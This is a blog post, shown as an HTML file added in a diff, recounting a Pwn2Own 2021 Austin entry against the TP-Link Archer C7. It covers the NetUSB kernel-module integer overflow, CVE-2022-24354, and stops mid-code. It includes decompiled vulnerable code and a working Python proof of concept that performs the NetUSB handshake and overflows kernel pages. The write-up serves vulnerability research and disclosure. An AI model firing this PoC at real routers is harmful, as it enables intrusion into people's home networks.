@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Competing in Pwn2Own 2021 Austin: Icarus at the Zenith</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="Axel '0vercl0k' Souchet">
+    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-2 {
+        font-size: 8pt;
+      }
+      .tag-4 {
+        font-size: 6pt;
+     }
+    </style>
+    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />
+
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
+    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-MRPDMQ259W'></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-MRPDMQ259W');
+</script>
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+              <ul class="nav">
+                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
+              </ul>
+
+                <li >
+                    <a href="../../../../../category/debugging.html">
+                      <i class="icon-folder-open icon-large"></i>debugging
+                    </a>
+                </li>
+                <li class="active">
+                    <a href="../../../../../category/exploitation.html">
+                      <i class="icon-folder-open icon-large"></i>exploitation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/misc.html">
+                      <i class="icon-folder-open icon-large"></i>misc
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/obfuscation.html">
+                      <i class="icon-folder-open icon-large"></i>obfuscation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/reverse-engineering.html">
+                      <i class="icon-folder-open icon-large"></i>reverse-engineering
+                    </a>
+                </li>
+
+                <li><a href="../../../../../pages/about.html">About</a></li>
+                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>
+
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to Competing in Pwn2Own 2021 Austin: Icarus at the Zenith">
+                                        Competing in Pwn2Own 2021 Austin: Icarus at the Zenith
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<span class="label">Date</span>
+<abbr class="published" title="2022-03-26T08:00:00-07:00">
+        <i class="icon-calendar"></i>Sat 26 March 2022
+</abbr>
+<span class="label">By</span>
+<a href="../../../../../author/axel-0vercl0k-souchet.html"><i class="icon-user"></i>Axel "0vercl0k" Souchet</a>
+<span class="label">Category</span>
+<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>
+
+
+<span class="label">Tags</span>
+	<a href="../../../../../tag/pwn2own-austin.html"><i class="icon-tag"></i>Pwn2Own Austin</a>
+	<a href="../../../../../tag/pwn2own.html"><i class="icon-tag"></i>Pwn2Own</a>
+	<a href="../../../../../tag/routers.html"><i class="icon-tag"></i>routers</a>
+	<a href="../../../../../tag/tp-link.html"><i class="icon-tag"></i>TP-Link</a>
+	<a href="../../../../../tag/archer-c7.html"><i class="icon-tag"></i>Archer C7</a>
+	<a href="../../../../../tag/tp-link-archer-c7-v5.html"><i class="icon-tag"></i>TP-Link Archer C7 V5</a>
+	<a href="../../../../../tag/zenith.html"><i class="icon-tag"></i>Zenith</a>
+	<a href="../../../../../tag/remote-kernel.html"><i class="icon-tag"></i>remote kernel</a>
+	<a href="../../../../../tag/netusb.html"><i class="icon-tag"></i>NetUSB</a>
+	<a href="../../../../../tag/cve-2022-24354.html"><i class="icon-tag"></i>CVE-2022-24354</a>
+	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
+	<a href="../../../../../tag/memory-corruption.html"><i class="icon-tag"></i>memory-corruption</a>
+</footer><!-- /.post-info -->                </div>
+                <h1 id="introduction">Introduction</h1>
+<p>In 2021, I finally spent some time looking at a consumer router I had been using for years. It started as a weekend project to look at something a bit different from what I was used to. On top of that, it was also a good occasion to play with new tools, learn new things.</p>
+<p>I downloaded <a href="https://ghidra-sre.org/">Ghidra</a>, grabbed a firmware update and started to reverse-engineer various MIPS binaries that were running on my NETGEAR DGND3700v2 device. I quickly was pretty horrified with what I found and wrote <a href="https://github.com/0vercl0k/longue-vue">Longue vue 🔭</a> over the weekend which was a lot of fun (maybe a story for next time?). The security was such a joke that I threw the router away the next day and ordered a new one. I just couldn't believe this had been sitting in my network for several years. Ugh 😞.</p>
+<p>Anyways, I eventually received a brand new TP-Link router and started to look into that as well. I was pleased to see that code quality was much better and I was slowly grinding through the code after work. Eventually, in May 2021, the <a href="https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin">Pwn2Own 2021 Austin</a> contest was announced where routers, printers and phones were available targets. Exciting. Participating in that kind of competition has always been on my TODO list and I convinced myself for the longest time that I didn't have what it takes to participate 😅.</p>
+<p>This time was different though. I decided I would commit and invest the time to focus on a target and see what happens. It couldn't hurt. On top of that, a few friends of mine were also interested and motivated to break some code, so that's what we did. In this blogpost, I'll walk you through the journey to prepare and enter the competition with the <em>mofoffensive</em> team.</p>
+<div class="toc"><span class="toctitle">Table of contents:</span><ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#target-selections">Target selections</a></li>
+<li><a href="#getting-a-shell-on-the-target">Getting a shell on the target</a></li>
+<li><a href="#enumerating-the-attack-surfaces">Enumerating the attack surfaces</a></li>
+<li><a href="#chasing-ghosts">Chasing ghosts</a></li>
+<li><a href="#netusb-shenanigans">NetUSB shenanigans</a></li>
+<li><a href="#booting-netusb-in-qemu">Booting NetUSB in QEMU</a></li>
+<li><a href="#enters-zenith">Enters Zenith</a></li>
+<li><a href="#entering-the-contest">Entering the contest</a></li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="target-selections">Target selections</h1>
+<p>At this point, <a href="https://twitter.com/pwning_me">@pwning_me</a>, <a href="https://twitter.com/chillbro4201">@chillbro4201</a> and I are motivated and chatting hard on discord. The end goal for us is to participate to the contest and after taking a look at the <a href="https://www.zerodayinitiative.com/Pwn2OwnAustin2021Rules.html">contest's rules</a>, the path of least resistance seems to be targeting a router. We had a bit more experience with them, the hardware was easy and cheap to get so it felt like the right choice.</p>
+<p><center><img alt="router targets" src="/images/pwn2own_austin_2021/router_targets.png"></center></p>
+<p>At least, that's what we thought was the path of least resistance. After attending the contest, maybe printers were at least as soft but with a higher payout. But whatever, we weren't in it for the money so we focused on the router category and stuck with it.</p>
+<p>Out of the 5 candidates, we decided to focus on the consumer devices because we assumed they would be softer. On top of that, I had a little bit of experience looking at TP-Link, and somebody in the group was familiar with NETGEAR routers. So those were the two targets we chose, and off we went: logged on Amazon and ordered the hardware to get started. That was exciting.</p>
+<p><center><img src="/images/pwn2own_austin_2021/router_netgear.png" width=50%></img></center></p>
+<p>The TP-Link AC1750 Smart Wi-Fi router arrived at my place and I started to get going. But where to start? Well, the best thing to do in those situations is to get a root shell on the device. It doesn't really matter how you get it, you just want one to be able to figure out what are the interesting attack surfaces to look at.</p>
+<p><center><img src="/images/pwn2own_austin_2021/router_tplink.png" width=50%></img></center></p>
+<p>As mentioned in the introduction, while playing with my own TP-Link router in the months prior to this I had found a post auth vulnerability that allowed me to execute shell commands. Although this was useless from an attacker perspective, it would be useful to get a shell on the device and bootstrap the research. Unfortunately, the target wasn't vulnerable and so I needed to find another way.</p>
+<p>Oh also. Fun fact: I actually initially ordered the wrong router. It turns out TP-Link sells two line of products that look very similar: the <strong>A7</strong> and the <strong>C7</strong>. I bought the former but needed the latter for the contest, yikers 🤦🏽‍♂️. Special thanks to Cody for letting me know 😅!</p>
+<h1 id="getting-a-shell-on-the-target">Getting a shell on the target</h1>
+<p>After reverse-engineering the web server for a few days, looking for low hanging fruits and not finding any, I realized that I needed to find another way to get a shell on the device.</p>
+<p>After googling a bit, I found an article written by my countrymen: <a href="https://www.synacktiv.com/publications/pwn2own-tokyo-2020-defeating-the-tp-link-ac1750.html">Pwn2own Tokyo 2020: Defeating the TP-Link AC1750</a> by <a href="https://twitter.com/0xMitsurugi">@0xMitsurugi</a> and <a href="https://twitter.com/swapgs">@swapg</a>. The article described how they compromised the router at Pwn2Own Tokyo in 2020 but it also described how they got a shell on the device, great 🙏🏽. The issue is that I really have no hardware experience whatsoever. None.</p>
+<p>But fortunately, I have pretty cool friends. I pinged my boy <a href="https://twitter.com/bsmtiam">@bsmtiam</a>, he recommended to order a <a href="https://www.amazon.com/gp/product/B014GZTCC6/">FT232 USB cable</a> and so I did. I received the hardware shortly after and swung by his place. He took apart the router, put it on a bench and started to get to work.</p>
+<p><center><img src="/images/pwn2own_austin_2021/bench.jpeg"></img></center></p>
+<p>After a few tries, he successfully soldered the UART. We hooked up the FT232 USB Cable to the router board and plugged it into my laptop:</p>
+<p><center><img src="/images/pwn2own_austin_2021/ft232.jpeg"></img></center></p>
+<p>Using Python and the <code>minicom</code> library, we were finally able to drop into an interactive root shell 💥:</p>
+<p><center><img src="/images/pwn2own_austin_2021/shell.gif"></img></center></p>
+<p>Amazing. To celebrate this small victory, we went off to grab a burger and a beer 🍻 at the local pub. Good day, this day.</p>
+<h1 id="enumerating-the-attack-surfaces">Enumerating the attack surfaces</h1>
+<p>It was time for me to figure out which areas I should try to focus my time on. I did a bunch of reading as this router has been targeted multiple times over the years at Pwn2Own. I figured it might be a good thing to try to break new grounds to lower the chance of entering the competition with a duplicate and also maximize my chances at finding something that would allow me to enter the competition. Before thinking about duplicates, I need a bug.</p>
+<p>I started to do some very basic attack surface enumeration: processes running, iptable rules, sockets listening, crontable, etc. Nothing fancy.</p>
+<div class="highlight"><pre><span></span><code># ./busybox-mips netstat -platue
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:33344           0.0.0.0:*               LISTEN      -
+tcp        0      0 localhost:20002         0.0.0.0:*               LISTEN      4877/tmpServer
+tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:www             0.0.0.0:*               LISTEN      4940/uhttpd
+tcp        0      0 0.0.0.0:domain          0.0.0.0:*               LISTEN      4377/dnsmasq
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      5075/dropbear
+tcp        0      0 0.0.0.0:https           0.0.0.0:*               LISTEN      4940/uhttpd
+tcp        0      0 :::domain               :::*                    LISTEN      4377/dnsmasq
+tcp        0      0 :::ssh                  :::*                    LISTEN      5075/dropbear
+udp        0      0 0.0.0.0:20002           0.0.0.0:*                           4878/tdpServer
+udp        0      0 0.0.0.0:domain          0.0.0.0:*                           4377/dnsmasq
+udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           4377/dnsmasq
+udp        0      0 0.0.0.0:54480           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:42998           0.0.0.0:*                           5883/conn-indicator
+udp        0      0 :::domain               :::*                                4377/dnsmasq
+</code></pre></div>
+
+
+<p>At first sight, the following processes looked interesting:
+- the <code>uhttpd</code> HTTP server,
+- the third-party <code>dnsmasq</code> service that potentially could be unpatched to upstream bugs (unlikely?),
+- the <code>tdpServer</code> which was popped back in 2021 and was a vector for a vuln exploited in <code>sync-server</code>.</p>
+<h1 id="chasing-ghosts">Chasing ghosts</h1>
+<p>Because I was familiar with how the <code>uhttpd</code> HTTP server worked on my home router I figured I would at least spend a few days looking at the one running on the target router. The HTTP server is able to run and invoke Lua extensions and that's where I figured bugs could be: command injections, etc. But interestingly enough, all the existing public Lua tooling failed at analyzing those extensions which was both frustrating and puzzling. Long story short, it seems like the Lua runtime used on the router has been modified such that the opcode table appears shuffled. As a result, the compiled extensions would break all the public tools because the opcodes wouldn't match. Silly. I eventually managed to decompile some of those extensions and found one bug but it probably was useless from an attacker perspective. It was time to move on as I didn't feel there was enough potential for me to find something interesting there.</p>
+<p>One another thing I burned time on is to go through the GPL code archive that TP-Link published for this router: <a href="https://static.tp-link.com/resources/gpl/ArcherC7V5.tar.bz2">ArcherC7V5.tar.bz2</a>. Because of licensing, TP-Link has to (?) 'maintain' an archive containing the GPL code they are using on the device. I figured it could be a good way to figure out if <code>dnsmasq</code> was properly patched to recent vulns that have been published in the past years. It looked like some vulns weren't patched, but the disassembly showed different 😔. Dead-end.</p>
+<h1 id="netusb-shenanigans">NetUSB shenanigans</h1>
+<p>There were two strange lines in the <code>netstat</code> output from above that did stand out to me:</p>
+<div class="highlight"><pre><span></span><code>tcp        0      0 0.0.0.0:33344           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      -
+</code></pre></div>
+
+
+<p>Why is there no process name associated with those sockets uh 🤔? Well, it turns out that after googling and looking around those sockets are opened by a... wait for it... kernel module. It sounded pretty crazy to me and it was also the first time I saw this. Kinda exciting though.</p>
+<p>This <a href="https://www.kcodes.com/product/1/36">NetUSB.ko</a> kernel module is actually a piece of software written by the <a href="https://www.kcodes.com/">KCodes</a> company to do USB over IP. The other wild stuff is that I remembered seeing this same module on my NETGEAR router. Weird. After googling around, it was also not a surprise to see that multiple vulnerabilities were discovered and exploited in the past and that indeed TP-Link was not the only router to ship this module.</p>
+<p>Although I didn't think it would be likely for me to find something interesting in there, I still invested time to look into it and get a feel for it. After a few days reverse-engineering this statically, it definitely looked much more complex than I initially thought and so I decided to stick with it for a bit longer.</p>
+<p>After grinding through it for a while things started to make sense: I had reverse-engineered some important structures and was able to follow the untrusted inputs deeper in the code. After enumerating a lot of places where the attacker inputs is parsed and used, I found this one spot where I could overflow an integer in arithmetic fed to an allocation function:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">char</span> <span class="n">HostCommand</span><span class="p">,</span> <span class="kt">char</span> <span class="n">Opcode</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// ...</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">v64</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">_bswapw</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="o">&lt;-----------------------</span> <span class="n">attacker</span> <span class="n">controlled</span>
+    <span class="n">Payload_1</span> <span class="o">=</span> <span class="n">mallocPageBuf</span><span class="p">(</span><span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">9</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">);</span> <span class="o">&lt;----</span> <span class="n">overflow</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">Payload_1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// ...</span>
+      <span class="k">if</span><span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">Payload_1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">v64</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</code></pre></div>
+
+
+<p>I first thought this was going to lead to a wild overflow type of bug because the code would try to read a very large number of bytes into this buffer but I still went ahead and crafted a PoC. That's when I realized that I was wrong. Looking carefuly, the <code>SoftwareBus_fillBuf</code> function is actually defined as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">Buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">BufferLen</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span><span class="p">(</span><span class="n">BufferLen</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">GetLen</span> <span class="o">=</span> <span class="n">KTCP_get</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">SbusConnection</span><span class="o">-&gt;</span><span class="n">ClientSocket</span><span class="p">,</span> <span class="n">Buffer</span><span class="p">,</span> <span class="n">BufferLen</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">GetLen</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+          <span class="n">BufferLen</span> <span class="o">-=</span> <span class="n">GetLen</span><span class="p">;</span>
+          <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">Buffer</span> <span class="o">+</span> <span class="n">GetLen</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">BufferLen</span> <span class="p">)</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: _fillBuf(): len = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">1275</span><span class="p">,</span> <span class="n">GetLen</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="c1">// ...</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">// ...</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p><code>KTCP_get</code> is basically a wrapper around <code>ks_recv</code>, which basically means an attacker can force the function to return without reading the whole <code>BufferLen</code> amount of bytes. This meant that I could force an allocation of a small buffer and overflow it with as much data I wanted. If you are interested to learn on how to trigger this code path in the first place, please check how the handshake works in <a href="https://github.com/0vercl0k/zenith/blob/main/src/zenith-poc.py">zenith-poc.py</a> or you can also read <a href="https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/">CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers</a> from  <a href="https://twitter.com/maxpl0it">@maxpl0it</a>. The below code can trigger the above vulnerability:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+<span class="n">le8</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">i</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;=B&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">le32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">i</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+
+<span class="n">netusb_port</span> <span class="o">=</span> <span class="mi">20005</span>
+
+<span class="k">def</span> <span class="nf">send_handshake</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">aes_ctx</span><span class="p">):</span>
+  <span class="c1"># Version</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x56\x04</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="c1"># Send random data</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">aes_ctx</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">16</span><span class="p">))</span>
+  <span class="n">_</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+  <span class="c1"># Receive &amp; send back the random numbers.</span>
+  <span class="n">challenge</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">aes_ctx</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">challenge</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">send_bus_name</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+  <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+  <span class="k">assert</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="mi">63</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">le32</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
+  <span class="n">b</span> <span class="o">=</span> <span class="n">name</span>
+  <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create_connection</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+  <span class="n">second_aes_k</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">&#39;5c130b59d26242649ed488382d5eaecc&#39;</span><span class="p">)</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+  <span class="n">aes_ctx</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">second_aes_k</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+  <span class="n">send_handshake</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">aes_ctx</span><span class="p">)</span>
+  <span class="n">send_bus_name</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">s</span><span class="p">,</span> <span class="n">aes_ctx</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+  <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="s1">&#39;Zenith PoC2&#39;</span><span class="p">)</span>
+  <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="n">required</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+  <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+  <span class="n">s</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">create_connection</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">netusb_port</span><span class="p">,</span> <span class="s1">&#39;PoC2&#39;</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">le8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">))</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">le8</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">le32</span><span class="p">(</span><span class="mh">0xff_ff_ff_ff</span><span class="p">))</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xab</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1_000</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
+  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div>
+
+
+<p>Another interesting detail was that the allocation function is <code>mallocPageBuf</code> which I didn't know about. After looking into its implementation, it eventually calls into <code>_get_free_pages</code> which is part of the Linux kernel. <code>_get_free_pages</code> allocates 2**n number of pages, and is implemented using what is called, a Binary Buddy Allocator. I wasn't familiar with that kind of allocator, and ended-up kind of fascinated by it. You can read about it in <a href="https://www.kernel.org/doc/gorman/html/understand/understand009.html">Chapter 6: Physical Page Allocation</a> if you want to know more.</p>
+<p><center><img src="/images/pwn2own_austin_2021/buddy.png"></img></center></p>
+<p>Wow ok, so maybe I could do something useful with this bug. Still a long shot, but based on my understanding the bug would give me full control over the content and I was able to overflow the pages with pretty much as much data as I wanted. The only thing that I couldn't fully control was the size passed to the allocation. The only limitation was that I could only trigger a <code>mallocPageBuf</code> call with a size in the following interval: <code>[0, 8]</code> because of the integer overflow. <code>mallocPageBuf</code> aligns the passed size to the next power of two, and calculates the <code>order</code> (n in 2**n) to invoke <code>_get_free_pages</code>.</p>
+<p>Another good thing going for me was that the kernel didn't have KASLR, and I also noticed that the kernel did its best to keep running even when encountering access violations or whatnot. It wouldn't crash and reboot at the first hiccup on the road but instead try to run until it couldn't anymore. Sweet.</p>
+<p>I also eventually discovered that the driver was leaking kernel addresses over the network. In the above snippet, <code>kc_printf</code> is invoked with diagnostic / debug strings. Looking at its code, I realized the strings are actually sent over the network on a different port. I figured this could also be helpful for both synchronization and leaking some allocations made by the driver.</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">kc_printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+  <span class="c1">// ...</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="n">vsprintf</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">257</span><span class="p">;</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">v2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">v6</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>
+  <span class="p">}</span>
